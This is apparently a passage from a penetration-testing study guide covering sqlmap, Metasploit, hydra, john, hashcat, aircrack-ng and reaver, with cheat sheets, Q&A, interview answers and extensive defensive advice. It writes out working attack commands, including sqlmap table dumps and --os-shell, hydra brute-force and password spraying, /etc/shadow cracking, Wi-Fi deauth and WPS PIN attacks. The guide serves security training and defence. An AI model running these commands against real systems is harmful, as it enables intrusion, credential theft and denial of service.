$ sqlmap -u 'https://app.test/' --cookie 'sid=...; role=user' --level 2

# once a param is confirmed injectable:
$ sqlmap -r request.txt -p id --dbms mysql --current-user --current-db --is-dba
$ sqlmap -r request.txt -p id -D appdb --tables
$ sqlmap -r request.txt -p id -D appdb -T users --columns
$ sqlmap -r request.txt -p id -D appdb -T users -C username,password_hash --dump

# useful flags:
#   --batch            answer prompts with defaults (non-interactive)
#   --level 1..5        how many places/params to test (headers, cookies at higher levels)
#   --risk 1..3         how dangerous the test payloads are (3 can include OR-based / stacked)
#   --technique BEUSTQ  restrict to Boolean/Error/Union/Stacked/Time/inline-Query
#   --threads 5         parallelism (careful on prod)
#   --tamper=space2comment,between   evasion scripts (only where the RoE permits)
#   --proxy http://127.0.0.1:8080    route via Burp for logging/inspection
#   --flush-session     re-test from scratch;  -v3  see the payloads it sends
#   --os-shell / --sql-shell / --file-read   post-exploitation - only if explicitly authorised

Where this fits — and the defence for each

  • Used in: authorised web-app and infrastructure penetration tests, red-team engagements, OSCP/PNPT-style exams, CTFs, and vendor/researcher PoC validation. Metasploit is also a defensive tool — blue teams use it to validate that a patch actually closed a hole and to build detections.
  • Defeating Metasploit exploitation: timely patching / vulnerability management (most modules target old CVEs), network segmentation and egress filtering (breaks reverse shells), application allow-listing and EDR (catches Meterpreter and getsystem), disabling unused services, and least privilege so a foothold isn't game over.
  • Defeating sqlmap / SQLi: parameterised queries / prepared statements everywhere (the real fix), an ORM used safely, input validation as defence-in-depth, a least-privilege DB account (no FILE, no DBA, per-app schema), a WAF as a speed bump not a fix, and query/error logging + alerting on injection signatures. Never build SQL by string concatenation.
  • Not: running exploits or --os-shell/--dump against systems outside your authorised scope, deploying persistence without sign-off, or using evasion features to attack third parties.
Cheat Sheet
  • msfconsole loop: search → use <module> → info/show options → set RHOSTS → set PAYLOAD + LHOST/LPORT → check → run → sessions -i.
  • Modules: exploit (triggers a CVE), auxiliary (scan/brute/fuzz, no payload), post (against a session), payload (bind vs reverse, staged vs stageless), Meterpreter (in-memory post-ex), msfvenom (payload files), multi/handler (catch callbacks).
  • Use workspace + db_nmap to keep engagement data together; hosts/services/loot/creds.
  • sqlmap: feed a saved request — sqlmap -r req.txt -p <param> --batch --level 3 --risk 2; then --dbs → -D db --tables → -T t --columns → -C ... --dump.
  • sqlmap knobs: --technique, --dbms, --threads, --tamper (evasion, RoE-gated), --proxy (via Burp), -v3 (see payloads), --flush-session.
  • --os-shell/--sql-shell/--file-read/--dump and MSF persistence = only with explicit authorisation.
  • Defences: patch mgmt + segmentation + EDR + least privilege (MSF); parameterised queries + least-priv DB user + WAF + logging (SQLi).
Q&A
In Metasploit, what's the difference between an exploit module and an auxiliary module?
An exploit module triggers a specific vulnerability and delivers a payload (so it can give you code execution / a session). An auxiliary module has no payload — it's for scanning, service/version enumeration, login brute-forcing, protocol fuzzing, gathering info, or (rarely, and usually out of scope) DoS. You often run auxiliary scanners first to confirm a target is vulnerable, then use the matching exploit.
Bind shell vs reverse shell — when does each work?
A bind payload opens a listening port on the target and you connect in — only works if you can reach that new port (no inbound firewall/NAT between you and the target). A reverse payload makes the target connect back to you (LHOST/LPORT) — works when the target has outbound access even though inbound is blocked, which is the common case. That's why reverse shells are the default, and why egress filtering is such an effective defence: block/inspect outbound and the callback fails.
sqlmap says a parameter is "not injectable" but you're fairly sure it is. What do you try?
(1) Feed it a complete real request (-r request.txt saved from Burp) so all headers/cookies/tokens are correct, and name the exact parameter with -p. (2) Raise coverage: --level 5 --risk 3 (tests more places — headers, cookies, JSON — and more aggressive payloads). (3) Hint the backend: --dbms, --technique, --prefix/--suffix if the injection needs to break out of a quoting context. (4) Handle app logic: --csrf-token/--csrf-url for anti-CSRF, --random-agent, --delay/--time-sec if a WAF or rate limit is interfering, and --tamper scripts if allowed. (5) -v3 to see the actual payloads and the responses — you may spot it's a second-order injection (input stored then used elsewhere) that sqlmap can't chain automatically, or that it's not SQL at all (NoSQL, LDAP). (6) Test the concept manually first (' OR '1'='1, a time delay) to confirm before automating.
What's the single most effective defence against everything sqlmap does?
Parameterised queries / prepared statements (or an ORM that uses them correctly) — the query structure is fixed and user input is only ever bound as data, so it can't change the SQL. That eliminates the vulnerability class itself. Everything else (WAF, input validation, least-privilege DB user, error suppression) is defence-in-depth that limits impact or raises effort, not a fix. A least-privilege DB account (no FILE privilege, not DBA, scoped to one schema) specifically kills sqlmap's --file-read/-write, --os-shell, and cross-database dumping even if an injection exists.
Why do experienced testers say Metasploit "isn't a substitute for understanding the exploit"?
Because a module can fail or misbehave in ways you can't diagnose or safely handle without knowing what it does: wrong target/offset can crash the service (availability impact you didn't authorise), a payload can be caught by EDR and tip off the blue team, check isn't always accurate, and some modules are memory-corruption exploits that are one-shot or leave the service unstable. Certs like OSCP restrict Metasploit for this reason — you're expected to understand the vuln, pick the right target, know the blast radius, and be able to exploit by hand. Metasploit is a great accelerator once you know what you're launching.
Interview Questions

Basic warm-up

What does set PAYLOAD control in Metasploit?
What code runs on the target after the exploit succeeds — e.g. a simple command shell, or Meterpreter (in-memory post-exploitation), and whether it's a bind listener on the target or a reverse connection back to your LHOST/LPORT.
What is the correct order of sqlmap operations to reach a specific table's data?
Confirm the injectable parameter → --dbs (list databases) → -D <db> --tables → -D <db> -T <table> --columns → -D <db> -T <table> -C <cols> --dump. Only against a target you're authorised to test.

Intermediate core

You get a Meterpreter session as a low-privileged user on a lab Windows host. Outline safe next steps and their defensive countermeasures.
Stabilise: getuid, sysinfo, ps, then migrate into a stable same-or-lower-privilege process so the session survives the exploited process dying (counter: EDR flags cross-process injection/migration; app allow-listing). Enumerate locally: OS build and patch level, running services, scheduled tasks, installed software, local users/groups, network config, AV/EDR present — via post/multi/recon/local_exploit_suggester and built-ins (counter: least functionality, patching removes the suggested privesc paths, logging of recon tooling). Privilege escalation: check for unquoted service paths, weak service permissions, AlwaysInstallElevated, token privileges, stored creds, DLL hijacking; try getsystem only knowing which technique it uses (counter: harden service ACLs, disable AlwaysInstallElevated, patch, credential hygiene, EDR detections for getsystem/named-pipe impersonation). Credentials: hashdump/LSASS access, DPAPI, browser/creds stores (counter: Credential Guard, LSA protection, no admin reuse, LAPS). Lateral movement / pivoting: run autoroute / portfwd to reach segments through this host — only to in-scope targets (counter: segmentation, no flat networks, egress filtering, monitoring east-west traffic). Discipline: stay in scope, don't touch production data, take screenshots/notes for the report, prefer non-destructive proof, and clean up (remove uploaded tools, migrated artefacts) — and get explicit sign-off before any persistence. The report's value is the chain plus the specific control that would have broken it at each step.

Advanced deep

Design a program that continuously validates your organisation's defences against the exploitation techniques these tools represent, without a full pentest each time.
Goal: know, on an ongoing basis, that patching, segmentation, WAF, DB privilege, EDR, and logging actually stop the standard attacks — "purple team as a service". Attack simulation: an automated breach-and-attack-simulation layer (open-source like Atomic Red Team / Caldera / Metasploit in a controlled harness, or a commercial BAS) that safely runs the technique catalogue mapped to MITRE ATT&CK — port scans, known-CVE exploit attempts against representative lab clones, reverse-shell callbacks, credential dumping, lateral movement, and SQLi payloads against a deliberately vulnerable app instance and against staging copies of real apps. Run in staging/lab environments that mirror prod, plus carefully scoped, non-destructive checks in prod (e.g. "can a host in segment A open an outbound connection to the internet on a random high port?"). Validation, per control: (1) Patch/vuln mgmt — run local_exploit_suggester-style checks and authenticated vuln scans continuously; alert on any host where a weaponised CVE is exploitable; measure mean-time-to-remediate. (2) Segmentation/egress — automated connectivity matrix tests from each segment (can B reach C? can anything egress to arbitrary ports/hosts?) and reverse-shell callback tests; fail if a callback succeeds from a server segment. (3) WAF/SQLi — a battery of sqlmap runs and manual payloads against staging apps with the WAF in blocking mode; track detection/block rate and false negatives; and independently verify the code uses parameterised queries (SAST, grep for string-built SQL) and that DB accounts are least-privilege (no FILE/DBA) — because the WAF is not the fix. (4) EDR/detection — run Meterpreter, getsystem, LSASS access, credential dumping, migration, persistence in the lab and confirm each generates a high-fidelity alert within SLA; feed gaps to detection engineering as new rules; re-test. (5) Logging/SIEM — confirm every simulated action produced the expected log and reached the SIEM (no silent gaps). Coverage & scoring: a dashboard of ATT&CK techniques vs "prevented / detected / neither", trended over time, with owners for each gap. Tie results to change management so a firewall or GPO change that regresses a control is caught by the next run. Safety: only safe/idempotent techniques in prod; destructive ones (real exploits, DoS) in lab only; a kill switch; clear allow-lists; SOC notified so it's a drill not an incident (but still measure their response). Cadence: continuous for connectivity/EDR/logging smoke tests; weekly for the SQLi/WAF battery; monthly for the fuller technique catalogue; annual human pentest for the creative attacks automation misses. Outputs: a living "are we exploitable via the obvious paths" scorecard, detection-engineering backlog, and evidence for auditors — and every new critical CVE triggers an ad-hoc "is this weaponisable against us and do we detect it" run. Net: BAS + connectivity tests + WAF/SQLi batteries + EDR/SIEM validation, mapped to ATT&CK, run continuously against prod-like environments, with a trended prevented/detected scorecard and owned remediation.

Password Cracking: hydra, john, hashcat

Two different jobs: hydra guesses logins against a live service; john and hashcat crack password hashes offline. Only against your own systems, a lab, a CTF, or hashes in an authorised engagement.

Notes

hydra — online login guessing

What / why. A parallel network login cracker for SSH, FTP, HTTP(S) forms/basic-auth, RDP, SMB, SMTP, databases, and more. It's rate-limited by the network and by the target's lockout/throttling, and it's noisy — every attempt is a real auth event. Use small, targeted lists; a full wordlist online is slow and gets you blocked.

$ hydra -l admin -P rockyou.txt ssh://10.10.10.7 -t 4          # one user, a wordlist, 4 threads
$ hydra -L users.txt -p 'Winter2025!' 10.10.10.7 smb          # password spray: one pw, many users
$ hydra -L users.txt -P pass.txt -u -f ftp://10.10.10.7       # -u loop users outer, -f stop on first hit

# HTTP POST form - you must supply the request template and a failure string:
$ hydra -l admin -P pass.txt 10.10.10.7 http-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid credentials" -t 8

# key flags: -t threads (keep low), -w wait, -f stop on success, -o out.txt,
#            -e nsr (also try null / user-as-pass / reversed), -s port, -S (SSL), -V verbose
# password SPRAYING (one/few passwords across many accounts, slowly) beats brute-forcing one
# account - it stays under lockout thresholds. Respect the account-lockout policy or you cause a DoS.

john the ripper — offline, auto-detecting

What / why. Cracks password hashes you already possess (from an authorised assessment, a lab, DFIR, or your own /etc/shadow). John auto-detects many hash formats, ships *2john helpers to extract hashes from files (ZIP, PDF, SSH keys, KeePass, kerberos), and has a strong default "single + wordlist + incremental" pipeline. Jumbo build has the widest format support.

$ unshadow /etc/passwd /etc/shadow > mine.hash        # your own box
$ ssh2john id_rsa > key.hash ; zip2john secret.zip > zip.hash ; keepass2john db.kdbx > kp.hash

$ john --wordlist=rockyou.txt --rules=Jumbo mine.hash     # wordlist + mangling rules
$ john --format=nt hashes.txt --wordlist=rockyou.txt      # force a format if detection is ambiguous
$ john --incremental mine.hash                            # brute-force by charset/length model
$ john --show mine.hash                                   # print cracked results
$ john --list=formats | tr ',' '\n' | grep -i sha         # what it supports

# john stores progress in ~/.john/john.pot ; Ctrl-C then re-run resumes.
# --fork=8 for multi-core CPU; hashcat is the tool once a GPU is involved.

hashcat — GPU-accelerated, mode-driven

What / why. The fastest cracker, built for GPUs. You specify the hash mode (-m) and the attack mode (-a). Its power is rules (word-mangling) and masks (targeted brute-force by position), which turn a wordlist into millions of realistic candidates cheaply.

$ hashcat -m 1000 hashes.txt rockyou.txt                      # -m 1000 = NTLM, straight wordlist
$ hashcat -m 22000 wifi.hc22000 -a 0 wordlist.txt -r rules/best64.rule   # WPA, wordlist + rules
$ hashcat -m 0 md5.txt -a 3 '?u?l?l?l?l?d?d?d'                # -a 3 mask: Upper lower*4 digit*3
$ hashcat -m 3200 bcrypt.txt rockyou.txt                      # bcrypt: SLOW even on a GPU (that's the point)
$ hashcat -m 1000 hashes.txt -a 6 wordlist.txt '?d?d?d?d'     # -a 6 = wordlist + mask suffix
$ hashcat --show -m 1000 hashes.txt ; hashcat --restore       # results / resume a session

# attack modes:  -a 0 straight  -a 1 combinator  -a 3 mask (brute)  -a 6 wl+mask  -a 7 mask+wl
# common -m:  0 MD5 · 100 SHA1 · 1400 SHA-256 · 1000 NTLM · 1800 sha512crypt · 3200 bcrypt ·
#             5600 NetNTLMv2 · 13100 Kerberoast(TGS) · 18200 AS-REP · 22000 WPA-PBKDF2 · 22921 (ssh)
# --potfile-path, --session, --status --status-timer 10, -w 3 (workload), -O (optimized kernel)

Wordlists, rules, and strategy

  • Wordlists: rockyou.txt (the classic), SecLists, language- and target-specific lists, and lists built from OSINT (company name, products, seasons, cewl from the target's website). Bigger isn't better — a good rule set on a medium list beats a giant raw list.
  • Rules (hashcat best64, OneRuleToRuleThemAll, dive; john Jumbo/KoreLogic): append digits/symbols, capitalise, leetspeak, year suffixes — model how humans mutate a base word.
  • Masks: when you know the policy (e.g. "8 chars, 1 upper, 1 digit"), a mask brute-forces exactly that space — far smaller than full brute-force.
  • Order: fast/cheap first — small targeted wordlist → wordlist + rules → masks for the known policy → combinator → big list + heavy rules. Stop when the RoE's time box is up.
  • Fast vs slow hashes: MD5/NTLM/SHA1 fall to billions/sec on a GPU; bcrypt/scrypt/argon2/PBKDF2 are deliberately slow (thousands/sec) — that's the whole point of a KDF.

The defensive payoff

  • Store passwords with a slow, salted KDF: argon2id (preferred), scrypt, or bcrypt — never MD5/SHA-1/unsalted SHA-256. Per-user salt defeats rainbow tables; the work factor defeats GPU throughput.
  • Length beats complexity: a 4-word passphrase resists cracking far better than P@ssw0rd1; enforce a minimum length, screen against breach lists (HIBP), drop forced periodic rotation.
  • MFA makes a cracked password insufficient on its own — the highest-leverage control.
  • Lockout / throttling / spray detection defeats hydra: progressive delays, temporary lockout, alert on one source hitting many accounts or many failures across the tenant, and on off-hours auth spikes.
  • Windows-specific: kill NTLM where possible, use long krbtgt/service-account passwords or gMSA (defeats Kerberoasting), enable pre-auth (defeats AS-REP roasting), Credential Guard, and LAPS for local admin.
Cheat Sheet
  • hydra = online, vs a live service; network- and lockout-bound; loud. hydra -l/-L user -p/-P pass <proto>://host -t 4 -f -o out; HTTP needs the form template + failure string. Prefer spraying (1 pw × many users, slow) over brute-forcing one account.
  • john = offline, auto-detect; *2john extractors (ssh2john, zip2john, keepass2john); john --wordlist=… --rules=…, --incremental, --show; resumes from ~/.john/john.pot; --fork for CPU.
  • hashcat = offline, GPU; pick -m (hash mode) and -a (0 straight / 1 combinator / 3 mask / 6 wl+mask). Rules (-r best64.rule) and masks (?u?l?d?s) multiply a wordlist. --show, --restore, --session.
  • Common -m: 0 MD5, 100 SHA1, 1000 NTLM, 1400 SHA-256, 1800 sha512crypt, 3200 bcrypt, 5600 NetNTLMv2, 13100 Kerberoast, 22000 WPA.
  • Strategy: targeted list → list+rules → policy mask → combinator → big list + heavy rules; stop at the time box.
  • Fast hashes (MD5/NTLM/SHA1) = billions/sec; slow KDFs (argon2/bcrypt/scrypt/PBKDF2) = thousands/sec by design.
  • Defence: argon2id/bcrypt + per-user salt + work factor; long passphrases + breach-list screening; MFA; lockout/throttle + spray detection; kill NTLM, gMSA, Kerberos pre-auth.
  • Only crack hashes / attempt logins you're authorised to (own systems, lab, CTF, signed engagement).
Q&A
hydra vs hashcat — what's the fundamental difference?
hydra does online attacks: it sends real login attempts to a running service, so it's limited by network latency, the service's rate-limiting, and account lockout — and every attempt is logged and alertable. hashcat (and john) do offline attacks: you already have the password hashes and you compute guesses locally against them, limited only by your GPU/CPU and the hash's cost — the target never knows. Online = few, careful, targeted guesses; offline = billions of guesses, silent.
Why is password spraying preferred over brute-forcing a single account?
Brute-forcing one account with a wordlist trips the lockout policy in a few tries (and locks the user out — a DoS you didn't authorise). Spraying flips it: try one plausible password (e.g. Season+Year!) across many accounts, slowly, then wait out the lockout window before the next password. Each account sees only 1–2 failures per window, staying under the threshold, while you still get broad coverage — large orgs almost always have someone using the obvious password. Defensively, this is why you alert on "one source, many accounts, few failures each" and on tenant-wide failure spikes, not just per-account counts.
You have NTLM hashes and bcrypt hashes from a lab. Which crack faster and why does that matter?
NTLM is a single unsalted MD4 — a modern GPU does tens of billions per second, so weak/medium NTLM passwords fall in seconds to hours. bcrypt is a deliberately slow, salted KDF with a tunable work factor — even a GPU rig manages only thousands to tens of thousands per second, and the per-user salt means you must attack each hash separately. The lesson for defenders: the hash algorithm is a security control. Never store passwords as NTLM/MD5/SHA-1/unsalted-SHA-256; use argon2id/bcrypt/scrypt with an appropriate cost so offline cracking is economically infeasible for anything but the worst passwords.
What do "rules" and "masks" do in hashcat, and when do you use each?
Rules mutate each wordlist entry the way humans do — capitalise, append 123/!/a year, leetspeak (a→@) — so a 10M-word list becomes billions of realistic candidates. Use rules when you have a decent base wordlist (real leaked passwords, OSINT terms). Masks brute-force a defined pattern by character position (?u?l?l?l?l?d?d?d?d = Upper + 4 lower + 4 digits). Use masks when you know the password policy or structure (min length, required character classes, a known prefix like a product name) — it searches exactly that space, which is vastly smaller than unconstrained brute-force. Often combined: -a 6 (wordlist + mask suffix) for "dictionary word followed by a 4-digit year".
Cracking is silent, so how would a defender ever know password hashes were stolen and are being cracked offline?
You can't detect the cracking itself — it happens on the attacker's hardware. You detect the theft and the use: alert on abnormal access to hash stores (LSASS reads, ntds.dit//etc/shadow copy, DB dumps of the users table, volume-shadow-copy abuse); assume any exfiltrated hash store is compromised and force a reset of everything in it, immediately, with a KDF/work-factor upgrade if needed; and detect the result — a previously-unseen credential suddenly working, logins from new locations/devices, impossible travel, use of a service account interactively. MFA blunts the payoff. So the strategy is: protect and monitor the hash stores, respond to exfiltration by mass-rotating, and rely on MFA + anomaly detection to catch a cracked password being used.
Interview Questions

Basic warm-up

Which tool here works without ever contacting the target system?
john and hashcat — they crack hashes you already hold, entirely offline. hydra is online: it sends login attempts to a live service.
In hashcat, what do -m and -a specify?
-m is the hash mode (which algorithm/format the hashes are, e.g. 1000 = NTLM, 3200 = bcrypt). -a is the attack mode (0 straight wordlist, 3 mask/brute-force, 6 wordlist+mask, etc.).

Intermediate core

You're authorised to test password strength for a 5,000-user org and you've obtained the NTLM hashes. Design the cracking approach and what you report.
Setup: work offline on the hashes only (never online against the DC); document chain of custody; time-box per the RoE. Attack ladder (fast/cheap first, hashcat -m 1000): (1) known-breach lists (HIBP NTLM, rockyou) straight; (2) same lists + a strong rule set (best64, then OneRuleToRuleThemAll); (3) OSINT-tuned list — company name, product names, city, sports teams, "Season+Year!" patterns, cewl from the corp site — with rules; (4) policy masks reflecting the AD password policy (e.g. ?u?l?l?l?l?l?d?d! variants); (5) combinator of two short lists; (6) heavier masks up to a sane length. Stop at the time box. Analysis: crack rate overall and by group (privileged accounts, service accounts, execs); count of passwords that are: reused across accounts, matching the company/season pattern, on a breach list, shorter than policy would suggest is safe, or identical to the username. Identify any privileged accounts cracked (report those urgently and privately). Check for password reuse between admin and standard accounts of the same person. Report (no plaintext passwords in the deliverable — stats, patterns, and the specific risky accounts by identifier): headline crack percentage, the dominant weak patterns, privileged exposure, and concrete fixes — enforce longer minimums / passphrases, deploy a breach-password filter (Azure AD Password Protection / on-prem equivalent), ban company/season patterns, require MFA everywhere (especially privileged), move service accounts to gMSA, and re-test after remediation. Emphasise that a 30% crack rate isn't "users are dumb" — it's "the policy and stored-hash choices allow it."

Advanced deep

Given how fast modern offline cracking is, design an authentication credential-storage and monitoring strategy that stays safe even if the hash store is stolen.
Assume the hash file will leak and make that survivable. Hashing: argon2id as the primary KDF (memory-hard — defeats GPU/ASIC parallelism), tuned to the strongest parameters your latency budget allows (e.g. ~256–512 MB, iterations to hit ~250–500 ms server-side), with a unique per-user salt and a server-side pepper/secret key stored in an HSM/KMS (so a DB-only theft yields uncrackable hashes — the attacker also needs the HSM key). Support algorithm agility: store the algo + params with each hash and transparently upgrade on next login. bcrypt (cost ≥ 12) or scrypt are acceptable fallbacks; never fast hashes. Password policy: minimum length ~12–16 (favour passphrases), no composition rules or forced rotation (NIST 800-63B), block breach-corpus and context-specific words at set/reset time. MFA: mandatory, phishing-resistant (FIDO2/passkeys) for privileged and high-value; TOTP/push-with-number-matching minimum for everyone — so a cracked password alone is worthless. Prefer passwordless (passkeys) to remove the crackable secret entirely where possible. Rate control on the live service: per-account and per-source throttling with progressive delays, tenant-wide spray detection (one source → many accounts, low per-account failures), CAPTCHA/step-up on anomaly, and IP reputation — defeats hydra-style online attacks. Protect the store: least-privilege DB access (the app can't bulk-read the auth table; a separate hardened auth service owns it), encryption at rest with KMS, DLP/alerting on bulk reads of the credential table, on ntds.dit/shadow/LSASS access, and on volume-shadow-copy abuse. Detect misuse of a cracked credential: device binding, impossible-travel and new-ASN/new-device alerts, behavioural analytics, and honeytoken accounts whose any successful login is an incident. Incident readiness: a tested "credential store compromised" runbook — force reset of every affected credential, invalidate all sessions/refresh tokens, rotate the pepper (which instantly invalidates offline cracking progress), bump KDF params, and require re-enrolment of MFA if that store was in scope. Metrics: % of logins passwordless/phishing-resistant MFA, KDF parameter currency, time-to-rotate on incident, and offline-crack resistance estimated against a defined attacker budget. Net: memory-hard KDF + HSM-held pepper so a stolen hash file is inert, passphrases + breach screening, phishing-resistant MFA (ideally passwordless), aggressive online rate control, tight access + exfil monitoring on the store, anomaly detection on credential use, and a rehearsed rotate-everything-including-the-pepper response.

Wi-Fi Security: aircrack-ng & reaver

Assess the security of a wireless network you own or are authorised to test: put the card in monitor mode, capture the WPA handshake, and try to crack the passphrase offline — or test WPS with reaver.

Notes

Monitor mode and scanning (aircrack-ng suite)

What / why. A normal Wi-Fi card only hears frames addressed to it. Monitor mode makes it capture all 802.11 frames on a channel. airmon-ng sets it up; airodump-ng scans for APs and clients and writes a capture file.

$ sudo airmon-ng check kill                 # stop NetworkManager/wpa_supplicant that fight monitor mode
$ sudo airmon-ng start wlan0               # -> wlan0mon (monitor interface)
$ sudo airodump-ng wlan0mon                 # live list: BSSID, channel, ENC (WPA2/WPA3), ESSID, clients

# focus on ONE authorised network and save the capture:
$ sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture wlan0mon
#   watch the top-right: "WPA handshake: AA:BB:.." appears once a client (re)connects

Forcing and capturing the WPA handshake

What / why. WPA/WPA2-PSK cracking needs the 4-way handshake, which only happens when a client joins. You can wait, or send a deauthentication frame to bump an existing client so it reconnects and you catch the handshake. Deauth is a real DoS on those clients — authorised targets only.

# in a second terminal, while airodump is capturing:
$ sudo aireplay-ng --deauth 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
#   --deauth N  = send N bursts   -a = AP BSSID   -c = a specific client (omit -c = broadcast, noisier)

$ aircrack-ng capture-01.cap               # verify: "1 handshake" for the BSSID
# modern alternative: hcxdumptool + hcxpcapngtool to get a hashcat 22000 file, and PMKID capture
$ hcxpcapngtool -o wifi.hc22000 capture-01.cap

Cracking the passphrase (offline)

What / why. With the handshake captured, the attack is a pure offline dictionary/mask attack against WPA's PBKDF2 — no more contact with the network. It succeeds only if the passphrase is in your wordlist (or matches your mask). WPA's KDF is slow-ish, so throughput is far below MD5/NTLM.

$ aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap     # CPU, simple
$ hashcat -m 22000 wifi.hc22000 rockyou.txt -r rules/best64.rule     # GPU, rules
$ hashcat -m 22000 wifi.hc22000 -a 3 '?d?d?d?d?d?d?d?d'              # if you know it's 8 digits (common ISP default)
#   8-char minimum means pure brute-force of the full charset is infeasible; ISP default-pattern
#   masks and human-passphrase wordlists are what actually work.

reaver — the WPS route

What / why. WPS (the "push button / 8-digit PIN" convenience feature) has a design flaw: the PIN is validated in two halves, cutting the space from 108 to ~11,000, and the last digit is a checksum — so an online PIN brute-force can recover the PIN (and then the WPA passphrase) in hours on a vulnerable router. Many routers added lockout/rate-limiting or disabled WPS; Pixie-Dust is an offline variant against routers with weak nonce generation.

$ sudo wash -i wlan0mon                     # list APs with WPS enabled and whether they're locked
$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv          # online PIN brute-force
$ sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -K 1 -vv          # -K = Pixie-Dust (offline, if vulnerable)
#   reaver options: -d delay, -l lock-delay, --no-nacks, -x on-fail-wait; 'bully' is an alternative.
# reaver is an ONLINE attack on the AP - it's noisy, can lock WPS, and can be a DoS. Authorised only.

Defence — and it's decisive

  • Use a long, random passphrase (or WPA-Enterprise/802.1X with per-user creds). 20+ random characters, or a 5–6 word passphrase, is not in anyone's wordlist and infeasible to brute-force — the offline attack simply fails.
  • Move to WPA3 (SAE / "Personal"): the Dragonfly handshake is resistant to offline dictionary attack — capturing it doesn't let you guess offline — and it adds forward secrecy. Use WPA3-only where clients allow, WPA3/WPA2 transitional otherwise (aware transitional mode still exposes a WPA2 handshake).
  • Disable WPS entirely — kills reaver/Pixie-Dust. If a router won't let you, replace it.
  • Segment the WLAN: guest SSID isolated from the corporate LAN, client isolation on, management interfaces not reachable from Wi-Fi.
  • Detect: a WIDS/WIPS (or even airodump on a sensor) flags deauth floods, rogue/evil-twin APs, and WPS brute-force patterns; alert on them.
  • Hardware/regulatory: many jurisdictions treat deauth/jamming as illegal even on your own gear in shared spectrum — know the local rules; test in an RF-isolated lab if unsure.
Cheat Sheet
  • Legality: your own AP / your own lab hardware / written engagement only. Deauth = a real DoS on clients.
  • Monitor mode: airmon-ng check kill → airmon-ng start wlan0 (→ wlan0mon).
  • Scan / capture: airodump-ng wlan0mon; focus: airodump-ng --bssid <AP> -c <ch> -w capture wlan0mon; wait for "WPA handshake".
  • Force handshake: aireplay-ng --deauth 3 -a <AP> -c <client> wlan0mon (broadcast if no -c, noisier).
  • Crack (offline): aircrack-ng -w list -b <AP> capture-01.cap, or hashcat -m 22000 wifi.hc22000 list -r rules. Also PMKID via hcxdumptool/hcxpcapngtool.
  • WPS: wash -i wlan0mon to find WPS APs; reaver -i wlan0mon -b <AP> -c <ch> -vv (online PIN), -K 1 Pixie-Dust (offline).
  • Success = passphrase in your wordlist. Long random passphrase / WPA3-SAE → offline attack fails.
  • Defence: 20+ char / multi-word PSK or 802.1X; WPA3; disable WPS; WLAN segmentation + client isolation; WIDS/WIPS for deauth/rogue-AP/WPS alerts.
Q&A
Why do you need to capture the 4-way handshake to crack WPA2-PSK, and why send a deauth?
WPA2-PSK derives the session keys from the passphrase (via PBKDF2) plus nonces exchanged in the 4-way handshake. Capturing that handshake gives you the values needed to test passphrase guesses offline — without it there's nothing to check guesses against. The handshake only occurs when a client joins the network, so if all clients are already connected you send a deauth frame to knock one off; it reconnects automatically and you capture the handshake. (Alternatively, PMKID capture can sometimes get crackable material from the AP without any client.)
After capturing the handshake, does the strength of the network matter, or is it already game over?
It matters completely — capturing the handshake is not the crack. From there it's a pure offline dictionary/mask attack against PBKDF2. If the passphrase is password123 or an 8-digit ISP default, it falls quickly. If it's 20 random characters or a 5-word passphrase, it is not in any wordlist and the keyspace is far too large to brute-force — the attack fails. So a strong PSK makes a captured handshake worthless.
What flaw does reaver exploit, and how do you shut it down?
WPS PIN authentication. The 8-digit PIN is checked in two 4-digit halves and the last digit is a checksum, so the effective space is only ~11,000 PINs — an online brute-force recovers it (and then the WPA passphrase the AP hands back) in hours on a router without lockout. Pixie-Dust is an offline variant against routers with weak randomness in the WPS exchange. Shut it down by disabling WPS entirely on the AP; if the firmware only offers "PIN off, push-button on", that's better but push-button has had issues too — off is best. Routers with WPS lockout after N failed PINs mitigate but don't eliminate it.
How does WPA3 change this attack?
WPA3-Personal replaces the PSK handshake with SAE (Simultaneous Authentication of Equals / "Dragonfly"), a password-authenticated key exchange. Capturing the handshake no longer lets you run an offline dictionary attack — each guess requires a fresh interaction with the AP or client, turning it back into a slow, detectable online attack. WPA3 also gives forward secrecy (a later passphrase compromise doesn't decrypt past captured traffic) and protected management frames (mitigating deauth). Caveat: "transitional" WPA3/WPA2 mode still lets a WPA2 client do a WPA2 handshake, so an attacker can downgrade; use WPA3-only SSIDs where your client base supports it.
Is it legal to run a deauth against your own home network to test it?
"Your own network" helps but isn't a blanket yes. Many countries regulate intentional RF interference/jamming, and a deauth flood is arguably that, in shared/unlicensed spectrum — some regulators (and the relevant statutes) don't carve out an exception for your own equipment if it can affect others' devices or spectrum. If neighbours' devices are on the same channel they can be hit too. Safe practice: test in an RF-shielded enclosure or a Faraday bag, use minimal deauth bursts, prefer passive capture / PMKID or just waiting for a natural handshake, and check your local telecom regulations. In a professional engagement, wireless testing scope and methods are spelled out in the RoE for exactly this reason.
Interview Questions

Basic warm-up

What does "monitor mode" do and why is it needed?
It makes the Wi-Fi card capture all 802.11 frames on a channel, not just those addressed to it — needed to see beacons, other clients, and to capture the WPA handshake. Set it with airmon-ng start wlan0.
Once you've captured a WPA2 handshake, what determines whether you can crack it?
Whether the passphrase is in your wordlist (or matches your mask). It's a pure offline dictionary/mask attack from that point — a long, random passphrase can't be cracked this way.

Intermediate core

You're doing an authorised wireless assessment of a corporate office. Outline your methodology and the report's key findings structure.
